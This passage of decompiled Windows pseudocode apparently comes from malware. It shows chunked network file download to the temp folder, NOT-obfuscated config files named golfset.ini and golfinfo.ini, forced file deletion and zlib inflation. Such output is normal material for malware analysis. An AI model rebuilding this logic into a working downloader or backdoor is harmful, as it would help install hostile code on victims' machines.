  wchar_t local_824;
  undefined local_822 [2046];
  uint local_24;
  size_t local_20;
  undefined4 local_1c;
  size_t local_18;
  undefined2 *local_14;
  int local_10;
  size_t local_c;
  wchar_t *local_8;
  
  local_24 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_824 = L'\0';
  _memset(local_822,0,0x7fe);
  local_8 = &local_824;
  if (param_5 != (wchar_t *)0x0) {
    local_8 = param_5;
  }
  *local_8 = L'\0';
  local_14 = (undefined2 *)0x0;
  local_c = 0;
  local_18 = 0;
  local_20 = 0;
  local_1c = 0;
  if ((*param_1 != 0) && (param_3 != 0)) {
    local_c = 0x1000;
    local_14 = (undefined2 *)operator_new(0x1000);
    iVar1 = FUN_00407910(param_1,local_14,&local_c,local_8);
    if ((iVar1 != 0) && (local_c = local_c - 6, -1 < (int)local_c)) {
      *param_2 = *local_14;
      local_10 = *(int *)(local_14 + 1);
      if ((int)*param_4 < (int)(local_18 + local_c)) {
        if ((int)local_18 < (int)*param_4) {
          _memcpy((void *)(param_3 + local_18),local_14 + 3,*param_4 - local_18);
          local_18 = *param_4 - local_18;
        }
      }
      else {
        _memcpy((void *)(param_3 + local_18),local_14 + 3,local_c);
        local_18 = local_c;
      }
      for (local_20 = local_c; (int)local_20 < local_10; local_20 = local_20 + local_c) {
        local_c = 0x1000;
        iVar1 = FUN_00407910(param_1,local_14,&local_c,local_8);
        if ((iVar1 == 0) || (0x10000 < (int)(local_20 + local_c))) goto LAB_00407e03;
        if ((int)*param_4 < (int)(local_18 + local_c)) {
          if ((int)local_18 < (int)*param_4) {
            _memcpy((void *)(param_3 + local_18),local_14,*param_4 - local_18);
            local_18 = *param_4;
          }
        }
        else {
          _memcpy((void *)(param_3 + local_18),local_14,local_c);
          local_18 = local_18 + local_c;
        }
      }
      *param_4 = local_18;
      local_1c = 1;
    }
  }
LAB_00407e03:
  if (local_14 != (undefined2 *)0x0) {
    FUN_00410837(local_14);
  }
  local_14 = (undefined2 *)0x0;
  ___security_check_cookie_4(local_24 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00407e40(undefined4 *param_1,wchar_t *param_2)

{
  int iVar1;
  uint local_1018;
  undefined local_1014 [4096];
  uint local_14;
  uint local_10;
  FILE *local_c;
  size_t local_8;
  
  local_8 = 0x407e4d;
  local_14 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_c = (FILE *)0x0;
  local_1018 = 0;
  _DAT_0042c718 = 0;
  __wfopen_s(&local_c,param_2,(wchar_t *)&DAT_00427178);
  if ((local_c != (FILE *)0x0) && (iVar1 = Ordinal_16(*param_1,&local_10,4,0), iVar1 == 4)) {
    while ((local_1018 < local_10 &&
           (local_8 = Ordinal_16(*param_1,local_1014,0x1000,0), local_8 != 0))) {
      _fwrite(local_1014,1,local_8,local_c);
      _DAT_0042c718 = local_1018 + local_8;
      local_1018 = _DAT_0042c718;
    }
    _fclose(local_c);
  }
  ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00407f50(char *param_1,undefined2 param_2)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  size_t local_c38;
  wchar_t local_c34;
  undefined local_c32 [2050];
  ushort local_430;
  undefined4 local_42c [256];
  uint local_2c;
  int local_28;
  undefined4 local_24;
  size_t local_20;
  void *local_1c;
  short local_18;
  short local_14 [2];
  wchar_t *local_10;
  ushort local_c;
  wchar_t *local_8;
  
  local_2c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_24 = 0;
  puVar2 = &DAT_0042d568;
  puVar3 = local_42c;
  for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_20 = 0x200;
  local_1c = _malloc(0x10000);
  _memset(local_1c,0,0x10000);
  local_c38 = 0x10000;
  local_18 = 0xbb9;
  local_c34 = L'\0';
  _memset(local_c32,0,0x7fe);
  local_10 = &local_c34;
  local_28 = 0;
  local_14[0] = 0;
  iVar1 = FUN_00407300(param_1,param_2,&local_28,&local_c34);
  if (iVar1 == 0) {
    local_24 = 1;
  }
  else {
    iVar1 = FUN_00407720(&local_28,local_18,local_42c,local_20,&local_c34);
    if (iVar1 == 0) {
      local_24 = 3;
    }
    else if (local_1c != (void *)0x0) {
      iVar1 = FUN_00407bd0(&local_28,local_14,(int)local_1c,&local_c38,&local_c34);
      if (iVar1 == 0) {
        local_24 = 2;
      }
      else if ((local_14[0] == local_18) && (local_c38 != 0)) {
        _memset(&DAT_0042c720,0,0x578);
        local_c = 0;
        for (local_430 = 0; (int)(local_430 + 0x118) <= (int)local_c38;
            local_430 = local_430 + 0x118) {
          local_8 = (wchar_t *)((uint)local_430 + (int)local_1c);
          if ((*local_8 != L'\0') && (local_c < 5)) {
            _wcscpy_s((wchar_t *)(&DAT_0042c720 + (uint)local_c * 0x118),0x7f,local_8);
            _memcpy_s(&DAT_0042c824 + (uint)local_c * 0x118,0x14,local_8 + 0x82,0x14);
            *(undefined4 *)(&DAT_0042c820 + (uint)local_c * 0x118) = *(undefined4 *)(local_8 + 0x80)
            ;
            local_c = local_c + 1;
          }
        }
      }
      else {
        local_24 = 2;
      }
    }
  }
  if (local_1c != (void *)0x0) {
    _free(local_1c);
  }
  FUN_004075d0(&local_28);
  ___security_check_cookie_4(local_2c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004081e0(wchar_t *param_1,char *param_2,undefined2 param_3)

{
  wchar_t wVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  wchar_t *local_e4c;
  wchar_t *local_e3c;
  size_t local_e38;
  wchar_t local_e34;
  undefined local_e32 [2046];
  wchar_t local_634;
  undefined4 auStack_632 [256];
  int local_230;
  undefined4 local_22c;
  char local_225;
  size_t local_224;
  char *local_220;
  wchar_t local_21c;
  undefined local_21a [518];
  uint local_14;
  short local_10;
  short local_c [2];
  wchar_t *local_8;
  
  local_14 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  _memset(&local_634,0,0x400);
  _wcscpy_s(&local_634,0x1ff,param_1);
  local_e3c = param_1;
  do {
    wVar1 = *local_e3c;
    local_e3c = local_e3c + 1;
  } while (wVar1 != L'\0');
  puVar3 = &DAT_0042d568;
  puVar4 = (undefined4 *)((int)auStack_632 + ((int)local_e3c - (int)(param_1 + 1) >> 1) * 2);
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  local_e4c = param_1;
  do {
    wVar1 = *local_e4c;
    local_e4c = local_e4c + 1;
  } while (wVar1 != L'\0');
  local_224 = ((int)local_e4c - (int)(param_1 + 1) >> 1) * 2 + 0x202;
  local_220 = (char *)_malloc(0x10000);
  _memset(local_220,0,0x10000);
  local_e38 = 0x10000;
  local_10 = 0xbba;
  local_e34 = L'\0';
  _memset(local_e32,0,0x7fe);
  local_8 = &local_e34;
  local_230 = 0;
  local_22c = 0;
  local_c[0] = 0;
  local_21c = L'\0';
  _memset(local_21a,0,0x206);
  FUN_00403cc0(&local_21c);
  _wcscat_s(&local_21c,0x103,(wchar_t *)&DAT_00426d0c);
  iVar2 = FUN_00407300(param_2,param_3,&local_230,&local_e34);
  if ((((iVar2 != 0) &&
       (iVar2 = FUN_00407720(&local_230,local_10,&local_634,local_224,&local_e34), iVar2 != 0)) &&
      (iVar2 = FUN_00407bd0(&local_230,local_c,(int)local_220,&local_e38,&local_e34), iVar2 != 0))
     && (((local_c[0] == local_10 && (local_e38 != 0)) &&
         (local_225 = *local_220, local_225 == '\0')))) {
    _wcscat_s(&local_21c,0x104,(wchar_t *)&DAT_0042d360);
    FUN_00407e40(&local_230,&local_21c);
    local_22c = 1;
  }
  if (local_220 != (char *)0x0) {
    _free(local_220);
  }
  FUN_004075d0(&local_230);
  ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004084f0(void *param_1,size_t param_2,wchar_t *param_3)

{
  wchar_t wVar1;
  wchar_t *local_21c;
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  FILE *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  if ((param_1 == (void *)0x0) || (param_2 == 0)) goto LAB_0040862a;
  local_8 = (FILE *)0x0;
  if (param_3 == (wchar_t *)0x0) {
LAB_004085b5:
    GetTempPathW(0x104,&local_214);
    _wcscat_s(&local_214,0x104,u_golfinfo_ini_00426b84);
    __wfopen_s(&local_8,&local_214,(wchar_t *)&DAT_00426ba0);
  }
  else {
    local_21c = param_3;
    do {
      wVar1 = *local_21c;
      local_21c = local_21c + 1;
    } while (wVar1 != L'\0');
    if ((int)local_21c - (int)(param_3 + 1) >> 1 == 0) goto LAB_004085b5;
    __wfopen_s(&local_8,param_3,(wchar_t *)&DAT_00426b7c);
  }
  if (local_8 != (FILE *)0x0) {
    _fwrite(param_1,param_2,1,local_8);
    _fclose(local_8);
  }
LAB_0040862a:
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00408640(void *param_1,size_t param_2,wchar_t *param_3)

{
  wchar_t wVar1;
  wchar_t *local_21c;
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  FILE *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_8 = (FILE *)0x0;
  if (((param_1 != (void *)0x0) && (param_2 != 0)) && (param_3 != (wchar_t *)0x0)) {
    local_21c = param_3;
    do {
      wVar1 = *local_21c;
      local_21c = local_21c + 1;
    } while (wVar1 != L'\0');
    if ((int)local_21c - (int)(param_3 + 1) >> 1 != 0) {
      if (DAT_0042b060 == 3) {
        GetSystemDirectoryW(&local_214,0x104);
        _wcscat_s(&local_214,0x104,(wchar_t *)&DAT_00426ba8);
      }
      else {
        GetTempPathW(0x104,&local_214);
      }
      _wcscat_s(&local_214,0x104,param_3);
      __wfopen_s(&local_8,&local_214,(wchar_t *)&DAT_00426bac);
      if (local_8 != (FILE *)0x0) {
        _fread(param_1,param_2,1,local_8);
        _fclose(local_8);
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004087c0(void *param_1,size_t param_2,wchar_t *param_3)

{
  wchar_t wVar1;
  wchar_t *local_21c;
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  FILE *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_8 = (FILE *)0x0;
  if (((param_1 != (void *)0x0) && (param_2 != 0)) && (param_3 != (wchar_t *)0x0)) {
    local_21c = param_3;
    do {
      wVar1 = *local_21c;
      local_21c = local_21c + 1;
    } while (wVar1 != L'\0');
    if ((int)local_21c - (int)(param_3 + 1) >> 1 != 0) {
      GetTempPathW(0x104,&local_214);
      _wcscat_s(&local_214,0x104,param_3);
      __wfopen_s(&local_8,&local_214,(wchar_t *)&DAT_00426bb4);
      if (local_8 != (FILE *)0x0) {
        _fread(param_1,param_2,1,local_8);
        _fclose(local_8);
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00408900(void *param_1,int param_2)

{
  uint local_218;
  int local_210;
  int local_20c [129];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if (param_1 != (void *)0x0) {
    _memset(local_20c,0,0x200);
    if (param_2 == 0) {
      local_210 = FUN_00408640(local_20c,0x200,u_golfset_ini_00426bd8);
    }
    else {
      local_210 = FUN_004087c0(local_20c,0x200,u_golfinfo_ini_00426bbc);
    }
    if (local_210 != 0) {
      for (local_218 = 0; local_218 < 0x200; local_218 = local_218 + 1) {
        *(byte *)((int)local_20c + local_218) = ~*(byte *)((int)local_20c + local_218);
      }
      if (local_20c[0] == 0x504d534d) {
        _memmove(param_1,local_20c,0x200);
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00408a30(int *param_1)

{
  uint local_218;
  byte local_20c [516];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if ((param_1 != (int *)0x0) && (*param_1 == 0x504d534d)) {
    _memmove(local_20c,param_1,0x200);
    for (local_218 = 0; local_218 < 0x200; local_218 = local_218 + 1) {
      local_20c[local_218] = ~local_20c[local_218];
    }
    FUN_004084f0(local_20c,0x200,(wchar_t *)&DAT_00426c5c);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00408b10(LPCWSTR param_1,LPCVOID param_2,DWORD param_3)

{
  HANDLE hObject;
  DWORD DVar1;
  undefined4 local_10;
  
  local_10 = 0;
  hObject = FUN_00408c20(param_1,1);
  if ((hObject != (HANDLE)0xffffffff) &&
     (DVar1 = FUN_00408c70(hObject,param_2,param_3), DVar1 == param_3)) {
    local_10 = 1;
  }
  if (hObject != (HANDLE)0xffffffff) {
    CloseHandle(hObject);
  }
  return local_10;
}



BOOL __cdecl FUN_00408b90(LPCWSTR param_1)

{
  BOOL BVar1;
  uint local_10;
  
  local_10 = GetFileAttributesW(param_1);
  if (local_10 == 0xffffffff) {
    BVar1 = 0;
  }
  else {
    if ((local_10 & 1) != 0) {
      local_10 = local_10 ^ 1;
    }
    if ((local_10 & 4) != 0) {
      local_10 = local_10 ^ 4;
    }
    if ((local_10 & 2) != 0) {
      local_10 = local_10 ^ 2;
    }
    if ((local_10 & 0x20) != 0) {
      local_10 = local_10 ^ 0x20;
    }
    SetFileAttributesW(param_1,local_10);
    BVar1 = DeleteFileW(param_1);
    GetLastError();
  }
  return BVar1;
}



HANDLE __cdecl FUN_00408c20(LPCWSTR param_1,DWORD param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  BOOL BVar2;
  HANDLE pvVar3;
  
  bVar1 = FUN_00408ca0(param_1);
  if ((CONCAT31(extraout_var,bVar1) == 1) && (BVar2 = FUN_00408b90(param_1), BVar2 == 0)) {
    return (HANDLE)0xffffffff;
  }
  pvVar3 = CreateFileW(param_1,0x40000000,param_2,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
  return pvVar3;
}



DWORD __cdecl FUN_00408c70(HANDLE param_1,LPCVOID param_2,DWORD param_3)

{
  BOOL BVar1;
  DWORD local_8;
  
  BVar1 = WriteFile(param_1,param_2,param_3,&local_8,(LPOVERLAPPED)0x0);
  if (BVar1 == 0) {
    local_8 = 0;
  }
  return local_8;
}



bool __cdecl FUN_00408ca0(LPCWSTR param_1)

{
  DWORD DVar1;
  
  DVar1 = GetFileAttributesW(param_1);
  return DVar1 != 0xffffffff;
}



void __cdecl
FUN_00408cd0(LPCWSTR param_1,undefined4 param_2,undefined4 *param_3,void **param_4,char *param_5)

{
  int local_23c [139];
  void *local_10;
  uint local_c;
  int *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_8 = (int *)FUN_004103d0(param_1,param_2,param_5);
  if (local_8 != (int *)0x0) {
    FUN_004103f0(local_8,-1,local_23c);
    FUN_004103f0(local_8,0,local_23c);
    FUN_004104f0(local_8,0,param_3,*param_4);
    *param_4 = local_10;
    FUN_00410510(local_8);
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_00408d90(int param_1,int param_2,int param_3)

{
  undefined4 uVar1;
  int local_14;
  void *local_10;
  size_t local_c;
  void *local_8;
  
  local_8 = *(void **)(param_2 + 0xc);
  local_10 = *(void **)(param_1 + 0x30);
  if (*(void **)(param_1 + 0x34) < local_10) {
    local_14 = *(int *)(param_1 + 0x2c);
  }
  else {
    local_14 = *(int *)(param_1 + 0x34);
  }
  local_c = local_14 - (int)local_10;
  if (*(uint *)(param_2 + 0x10) < local_c) {
    local_c = *(size_t *)(param_2 + 0x10);
  }
  if ((local_c != 0) && (param_3 == -5)) {
    param_3 = 0;
  }
  *(size_t *)(param_2 + 0x10) = *(int *)(param_2 + 0x10) - local_c;
  *(size_t *)(param_2 + 0x14) = *(int *)(param_2 + 0x14) + local_c;
  if (*(int *)(param_1 + 0x38) != 0) {
    uVar1 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),local_10,local_c);
    *(undefined4 *)(param_1 + 0x3c) = uVar1;
    *(undefined4 *)(param_2 + 0x30) = *(undefined4 *)(param_1 + 0x3c);
  }
  if (local_c != 0) {
    _memcpy(local_8,local_10,local_c);
    local_8 = (void *)((int)local_8 + local_c);
    local_10 = (void *)((int)local_10 + local_c);
  }
  if (local_10 == *(void **)(param_1 + 0x2c)) {
    local_10 = *(void **)(param_1 + 0x28);
    if (*(int *)(param_1 + 0x34) == *(int *)(param_1 + 0x2c)) {
      *(undefined4 *)(param_1 + 0x34) = *(undefined4 *)(param_1 + 0x28);
    }
    local_c = *(int *)(param_1 + 0x34) - (int)local_10;
    if (*(uint *)(param_2 + 0x10) < local_c) {
      local_c = *(size_t *)(param_2 + 0x10);
    }
    if ((local_c != 0) && (param_3 == -5)) {
      param_3 = 0;
    }
    *(size_t *)(param_2 + 0x10) = *(int *)(param_2 + 0x10) - local_c;
    *(size_t *)(param_2 + 0x14) = *(int *)(param_2 + 0x14) + local_c;
    if (*(int *)(param_1 + 0x38) != 0) {
      uVar1 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),local_10,local_c);
      *(undefined4 *)(param_1 + 0x3c) = uVar1;
      *(undefined4 *)(param_2 + 0x30) = *(undefined4 *)(param_1 + 0x3c);
    }
    if (local_c != 0) {
      _memcpy(local_8,local_10,local_c);
      local_8 = (void *)((int)local_8 + local_c);
      local_10 = (void *)((int)local_10 + local_c);
    }
  }
  *(void **)(param_2 + 0xc) = local_8;
  *(void **)(param_1 + 0x30) = local_10;
  return param_3;
}



undefined4 * __thiscall
FUN_00408f80(void *this,undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4,
            int param_5)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),1,0x1a,this);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = 0;
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *(undefined4 *)((int)puVar1 + 0x12) = param_3;
    *(undefined4 *)((int)puVar1 + 0x16) = param_4;
  }
  return puVar1;
}



void __cdecl FUN_00408fe0(int param_1,byte **param_2,int param_3)

{
  byte *pbVar1;
  byte bVar2;
  int *piVar3;
  int iVar4;
  uint uVar5;
  uint local_54;
  uint local_50;
  uint local_4c;
  uint local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  uint local_34;
  uint local_2c;
  uint local_1c;
  uint local_18;
  undefined *local_14;
  undefined *local_10;
  byte *local_c;
  byte *local_8;
  
  piVar3 = *(int **)(param_1 + 4);
  local_8 = *param_2;
  local_c = param_2[1];
  local_18 = *(uint *)(param_1 + 0x20);
  local_1c = *(uint *)(param_1 + 0x1c);
  local_14 = *(undefined **)(param_1 + 0x34);
  if (local_14 < *(undefined **)(param_1 + 0x30)) {
    local_34 = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
  }
  else {
    local_34 = *(int *)(param_1 + 0x2c) - (int)local_14;
  }
  local_2c = local_34;
LAB_00409049:
  do {
    switch(*piVar3) {
    case 0:
      if ((0x101 < local_2c) && ((byte *)0x9 < local_c)) {
        *(uint *)(param_1 + 0x20) = local_18;
        *(uint *)(param_1 + 0x1c) = local_1c;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        *(undefined **)(param_1 + 0x34) = local_14;
        param_3 = FUN_0040bd20((uint)*(byte *)(piVar3 + 4),(uint)*(byte *)((int)piVar3 + 0x11),
                               *(int *)((int)piVar3 + 0x12),*(int *)((int)piVar3 + 0x16),param_1,
                               param_2);
        local_8 = *param_2;
        local_c = param_2[1];
        local_18 = *(uint *)(param_1 + 0x20);
        local_1c = *(uint *)(param_1 + 0x1c);
        local_14 = *(undefined **)(param_1 + 0x34);
        if (local_14 < *(undefined **)(param_1 + 0x30)) {
          local_3c = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
        }
        else {
          local_3c = *(int *)(param_1 + 0x2c) - (int)local_14;
        }
        local_2c = local_3c;
        if (param_3 != 0) {
          *piVar3 = (uint)(param_3 != 1) * 2 + 7;
          break;
        }
      }
      piVar3[3] = (uint)*(byte *)(piVar3 + 4);
      piVar3[2] = *(int *)((int)piVar3 + 0x12);
      *piVar3 = 1;
    case 1:
      for (; local_1c < (uint)piVar3[3]; local_1c = local_1c + 8) {
        if (local_c == (byte *)0x0) {
          *(uint *)(param_1 + 0x20) = local_18;
          *(uint *)(param_1 + 0x1c) = local_1c;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          *(undefined **)(param_1 + 0x34) = local_14;
          FUN_00408d90(param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_18 = (uint)*local_8 << ((byte)local_1c & 0x1f) | local_18;
        local_8 = local_8 + 1;
      }
      pbVar1 = (byte *)(piVar3[2] + (local_18 & *(uint *)(&DAT_00424958 + piVar3[3] * 4)) * 8);
      local_18 = local_18 >> (pbVar1[1] & 0x1f);
      local_1c = local_1c - pbVar1[1];
      bVar2 = *pbVar1;
      uVar5 = (uint)bVar2;
      if (uVar5 == 0) {
        piVar3[2] = *(int *)(pbVar1 + 4);
        *piVar3 = 6;
      }
      else if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) == 0) {
          piVar3[3] = uVar5;
          piVar3[2] = (int)(pbVar1 + *(int *)(pbVar1 + 4) * 8);
        }
        else {
          if ((bVar2 & 0x20) == 0) {
            *piVar3 = 9;
            param_2[6] = (byte *)s_invalid_literal_length_code_0042493c;
            *(uint *)(param_1 + 0x20) = local_18;
            *(uint *)(param_1 + 0x1c) = local_1c;
            param_2[1] = local_c;
            param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
            *param_2 = local_8;
            *(undefined **)(param_1 + 0x34) = local_14;
            FUN_00408d90(param_1,(int)param_2,-3);
            return;
          }
          *piVar3 = 7;
        }
      }
      else {
        piVar3[2] = uVar5 & 0xf;
        piVar3[1] = *(int *)(pbVar1 + 4);
        *piVar3 = 2;
      }
      break;
    case 2:
      uVar5 = piVar3[2];
      for (; local_1c < uVar5; local_1c = local_1c + 8) {
        if (local_c == (byte *)0x0) {
          *(uint *)(param_1 + 0x20) = local_18;
          *(uint *)(param_1 + 0x1c) = local_1c;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          *(undefined **)(param_1 + 0x34) = local_14;
          FUN_00408d90(param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_18 = (uint)*local_8 << ((byte)local_1c & 0x1f) | local_18;
        local_8 = local_8 + 1;
      }
      piVar3[1] = (local_18 & *(uint *)(&DAT_00424958 + uVar5 * 4)) + piVar3[1];
      local_18 = local_18 >> ((byte)uVar5 & 0x1f);
      local_1c = local_1c - uVar5;
      piVar3[3] = (uint)*(byte *)((int)piVar3 + 0x11);
      piVar3[2] = *(int *)((int)piVar3 + 0x16);
      *piVar3 = 3;
    case 3:
      for (; local_1c < (uint)piVar3[3]; local_1c = local_1c + 8) {
        if (local_c == (byte *)0x0) {
          *(uint *)(param_1 + 0x20) = local_18;
          *(uint *)(param_1 + 0x1c) = local_1c;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          *(undefined **)(param_1 + 0x34) = local_14;
          FUN_00408d90(param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_18 = (uint)*local_8 << ((byte)local_1c & 0x1f) | local_18;
        local_8 = local_8 + 1;
      }
      pbVar1 = (byte *)(piVar3[2] + (local_18 & *(uint *)(&DAT_00424958 + piVar3[3] * 4)) * 8);
      local_18 = local_18 >> (pbVar1[1] & 0x1f);
      local_1c = local_1c - pbVar1[1];
      bVar2 = *pbVar1;
      if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) != 0) {
          *piVar3 = 9;
          param_2[6] = (byte *)s_invalid_distance_code_00425ab0;
          *(uint *)(param_1 + 0x20) = local_18;
          *(uint *)(param_1 + 0x1c) = local_1c;
          param_2[1] = local_c;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          *(undefined **)(param_1 + 0x34) = local_14;
          FUN_00408d90(param_1,(int)param_2,-3);
          return;
        }
        piVar3[3] = (uint)bVar2;
        piVar3[2] = (int)(pbVar1 + *(int *)(pbVar1 + 4) * 8);
      }
      else {
        piVar3[2] = bVar2 & 0xf;
        piVar3[3] = *(int *)(pbVar1 + 4);
        *piVar3 = 4;
      }
      break;
    case 4:
      uVar5 = piVar3[2];
      for (; local_1c < uVar5; local_1c = local_1c + 8) {
        if (local_c == (byte *)0x0) {
          *(uint *)(param_1 + 0x20) = local_18;
          *(uint *)(param_1 + 0x1c) = local_1c;
          param_2[1] = (byte *)0x0;
          param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
          *param_2 = local_8;
          *(undefined **)(param_1 + 0x34) = local_14;
          FUN_00408d90(param_1,(int)param_2,param_3);
          return;
        }
        param_3 = 0;
        local_c = local_c + -1;
        local_18 = (uint)*local_8 << ((byte)local_1c & 0x1f) | local_18;
        local_8 = local_8 + 1;
      }
      piVar3[3] = (local_18 & *(uint *)(&DAT_00424958 + uVar5 * 4)) + piVar3[3];
      local_18 = local_18 >> ((byte)uVar5 & 0x1f);
      local_1c = local_1c - uVar5;
      *piVar3 = 5;
    case 5:
      for (local_10 = local_14 + -piVar3[3]; local_10 < *(undefined **)(param_1 + 0x28);
          local_10 = local_10 + (*(int *)(param_1 + 0x2c) - *(int *)(param_1 + 0x28))) {
      }
      while (piVar3[1] != 0) {
        if (local_2c == 0) {
          if ((local_14 == *(undefined **)(param_1 + 0x2c)) &&
             (*(int *)(param_1 + 0x30) != *(int *)(param_1 + 0x28))) {
            local_14 = *(undefined **)(param_1 + 0x28);
            if (local_14 < *(undefined **)(param_1 + 0x30)) {
              local_40 = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
            }
            else {
              local_40 = *(int *)(param_1 + 0x2c) - (int)local_14;
            }
            local_2c = local_40;
          }
          if (local_2c == 0) {
            *(undefined **)(param_1 + 0x34) = local_14;
            iVar4 = FUN_00408d90(param_1,(int)param_2,param_3);
            local_14 = *(undefined **)(param_1 + 0x34);
            if (local_14 < *(undefined **)(param_1 + 0x30)) {
              local_44 = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
            }
            else {
              local_44 = *(int *)(param_1 + 0x2c) - (int)local_14;
            }
            local_2c = local_44;
            if ((local_14 == *(undefined **)(param_1 + 0x2c)) &&
               (*(int *)(param_1 + 0x30) != *(int *)(param_1 + 0x28))) {
              local_14 = *(undefined **)(param_1 + 0x28);
              if (local_14 < *(undefined **)(param_1 + 0x30)) {
                local_48 = (*(int *)(param_1 + 0x30) - (int)local_14) - 1;
              }
              else {
                local_48 = *(int *)(param_1 + 0x2c) - (int)local_14;
              }
              local_2c = local_48;
            }
            if (local_2c == 0) {
              *(uint *)(param_1 + 0x20) = local_18;
              *(uint *)(param_1 + 0x1c) = local_1c;
              param_2[1] = local_c;
              param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
              *param_2 = local_8;
              *(undefined **)(param_1 + 0x34) = local_14;
              FUN_00408d90(param_1,(int)param_2,iVar4);
              return;
            }
          }
        }
        param_3 = 0;
        *local_14 = *local_10;
        local_14 = local_14 + 1;
        local_10 = local_10 + 1;
        local_2c = local_2c - 1;
        if (local_10 == *(undefined **)(param_1 + 0x2c)) {
          local_10 = *(undefined **)(param_1 + 0x28);
        }
        piVar3[1] = piVar3[1] + -1;
      }
      *piVar3 = 0;
      break;
    case 6:
      goto switchD_0040905e_caseD_6;
    case 7:
      if (7 < local_1c) {
        local_1c = local_1c - 8;
        local_c = local_c + 1;
        local_8 = local_8 + -1;
      }
      *(undefined **)(param_1 + 0x34) = local_14;
      iVar4 = FUN_00408d90(param_1,(int)param_2,param_3);
      local_14 = *(undefined **)(param_1 + 0x34);
      if (*(int *)(param_1 + 0x30) == *(int *)(param_1 + 0x34)) {
        *piVar3 = 8;
switchD_0040905e_caseD_8:
        *(uint *)(param_1 + 0x20) = local_18;
        *(uint *)(param_1 + 0x1c) = local_1c;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        *(undefined **)(param_1 + 0x34) = local_14;
        FUN_00408d90(param_1,(int)param_2,1);
      }
      else {
        *(uint *)(param_1 + 0x20) = local_18;
        *(uint *)(param_1 + 0x1c) = local_1c;
        param_2[1] = local_c;
        param_2[2] = param_2[2] + ((int)local_8 - (int)*param_2);
        *param_2 = local_8;
        *(undefined **)(param_1 + 0x34) = local_14;
        FUN_00408d90(param_1,(int)param_2,iVar4);
